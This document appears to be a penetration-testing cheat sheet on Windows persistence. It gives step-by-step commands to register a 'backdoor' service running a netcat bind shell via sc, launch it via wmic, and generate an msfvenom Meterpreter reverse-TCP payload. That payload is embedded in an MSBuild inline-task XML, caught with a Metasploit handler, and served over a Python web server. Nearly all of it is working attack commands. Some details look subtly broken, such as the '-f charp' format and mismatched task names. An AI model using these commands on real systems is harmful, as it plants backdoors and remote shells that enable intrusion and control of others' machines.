# Persistence

## sc
```bash
# target Terminal 1:
sc \\192.168.1.69 create backdoor binpath= "cmd.exe /k c:\malware\nc.exe -dlp 4444 -e cmd.exe"
sc \\192.168.1.69 start backdoor
```

## wmic
```bash
# target Terminal 2:
wmic node:192.168.1.69 process call create "c:\malware\nc.exe -dlp 4444 -e cmd.exe"
```

## MSFVenom, Metasploit, and MSBuild
Identify the correct MSBuild version for the target. 
```bash
# target Terminal 1:
dir /b /s C:\msbuild.exe
```

Create the payload. 
```bash
# attacker Terminal 1:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f charp -O payload.cs
```

Add the payload to a MSBuild XML file (see below). Then, get the XML file onto the target. 
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Demo">
   <MSBuildShell/>
  </Target>
   <UsingTask
    TaskName="Demo"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <!-- Double-check the path above this line! -->
    <Task>	
      <Code Type="Class" Language="cs">
      <!-- Payload generated by MSFVenom -->
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Start a handler. 
```bash
# attacker: terminal 1
sudo msfconsole 
use exploit/multi/handler
set LHOST 192.168.1.23
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
options # check your exploit settings
run
```

Host the exploit so the target can download it. 
```bash
# attacker Terminal 2:
sudo python3 -m http.server 8000
```

Get the target to execute the exploit. 
```bash
# target Terminal 1:
C:\Windows\Microsoft.NET\path\to\MSBuild.exe C:\rshell.xml
```

